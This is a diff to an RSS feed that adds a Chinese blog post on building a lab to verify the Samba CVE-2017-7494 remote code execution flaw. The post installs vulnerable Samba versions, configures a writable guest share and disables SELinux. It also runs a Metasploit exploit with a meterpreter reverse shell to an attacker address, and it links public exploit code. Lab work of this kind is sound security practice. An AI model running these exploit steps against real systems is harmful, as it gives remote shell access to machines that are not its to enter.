@@ -10,6 +10,162 @@
     <atom:link href="https://www.zer0d0y.info/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/feed/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>搭建漏洞利用测试环境</title>
+      <link>https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/</link>
+      <pubDate>Sun, 30 Jul 2017 21:25:03 +0800</pubDate>
+      
+      <guid>https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/</guid>
+      <description>
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;images/bug-hunting-labs.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;table class=&#34;image&#34;&gt;
+&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
+&lt;/table&gt;
+
+&lt;pre&gt;&lt;code&gt;TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;1-samba-cve-2017-7494-漏洞概述&#34;&gt;1.Samba CVE-2017-7494 漏洞概述&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;2-环境介绍&#34;&gt;2.环境介绍&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;攻击者操作系统：
+Kali linux 2017.1(kali-rolling)
+
+目标操作系统：
+Ubuntu 16.04.2 LTS
+
+漏洞软件包版本：
+samba 2:4.3.11+dfsg-0ubuntu0.16.04.6
+
+漏洞软件包下载地址：
+https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/12371197
+https://github.com/Zer0d0y/Samba-CVE-2017-7494/blob/master/Samba_CVE-2017-7494_pkgs.tar.gz
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;3-samba配置&#34;&gt;3.Samba配置&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;# Samba配置
+vi /etc/samba/smb.conf
+# 在文件最后添加如下内容
+[public]
+path = /share
+public = yes
+writable = yes
+guest ok = yes
+
+# 创建目录、设置权限、重启服务
+mkdir /share
+chown nobody:nogroup /share/
+/etc/init.d/smbd restart
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;4-漏洞利用-metasploit&#34;&gt;4.漏洞利用（metasploit）&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;msfconsole
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.168.8.95
+show targets
+set target 3
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.8.82
+set LPORT 51000
+show options
+exploit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;5-安装老版本软件包-ubuntu-和-centos-进行漏洞验证&#34;&gt;5.安装老版本软件包（Ubuntu 和 CentOS）进行漏洞验证&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;# Ubuntu
+方法一.通过launchpad下载
+https://launchpad.net/ubuntu/版本代号/+source/软件包名
+
+举例：Ubuntu 16.04 xenial
+https://launchpad.net/ubuntu/xenial/+source/samba
+选择相关版本：
+https://launchpad.net/ubuntu/+source/samba/2:4.3.11+dfsg-0ubuntu0.16.04.6
+选择平台：Builds ---&amp;gt; amd64
+https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/12371197
+下载所需软件包：
+dpkg -l | grep samba | cut -d&#39; &#39; -f3
+wget xxx.deb
+
+# CentOS
+方法一.
+yum --showduplicates list samba
+
+方法二.
+http://vault.centos.org/6.0/os/x86_64/Packages/
+http://vault.centos.org/6.0/os/SRPMS/Packages/ or http://ftp.redhat.com/redhat/linux/enterprise/6Server/en/os/SRPMS/
+http://rpm.pbone.net/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;6-查看软件包修复了哪些bug-漏洞&#34;&gt;6.查看软件包修复了哪些Bug（#漏洞）&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;# Ubuntu
+apt changelog samba
+
+# CentOS
+rpm -qa samba --changelog | head
+yum install yum-plugin-changelog
+yum changelog 1 samba | less
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;7-samba-cve-2017-7494-on-centos-6-5&#34;&gt;7.Samba CVE-2017-7494 on CentOS 6.5&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;# 安装老版本Samba
+yum --showduplicates list samba
+yum remove samba-*
+yum install samba-3.6.23-41.el6
+setenforce 0
+
+# 配置Samba
+vi /etc/samba/smb.conf
+[global]
+workgroup = WORKGROUP
+server string = 23 Samba Server Version %v
+netbios name = jsamba
+log file = /var/log/samba/log.%m
+
+security = share
+[public]
+path = /share
+public = yes
+writable = yes
+guest ok = yes
+
+mkdir /share
+chown nobody:nobody /share -R
+/etc/init.d/smb restart
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;附录-samba-cve-2017-7494-漏洞利用工具&#34;&gt;附录：Samba CVE-2017-7494 漏洞利用工具&lt;/h5&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/joxeankoret/CVE-2017-7494&#34;&gt;https://github.com/joxeankoret/CVE-2017-7494&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/sambaPipe.py&#34;&gt;https://github.com/CoreSecurity/impacket/blob/master/examples/sambaPipe.py&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://github.com/opsxcq/exploit-CVE-2017-7494&#34;&gt;https://github.com/opsxcq/exploit-CVE-2017-7494&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://github.com/omri9741/cve-2017-7494&#34;&gt;https://github.com/omri9741/cve-2017-7494&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Notes on CoreSecurity impacket
+修改文件impacket/smb3.py
+# 行925 注释掉 fileName = string.replace(fileName, &#39;/&#39;, &#39;\\&#39;)
+# 行927 注释掉 fileName = ntpath.normpath(fileName)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
       <title>互联网企业安全指南（二）：系统安全加固指南</title>
       <link>https://www.zer0d0y.info/post/advanced-enterprise-security-guidelines-for-internet-companies-part2/</link>
       <pubDate>Fri, 21 Apr 2017 11:23:21 +0800</pubDate>
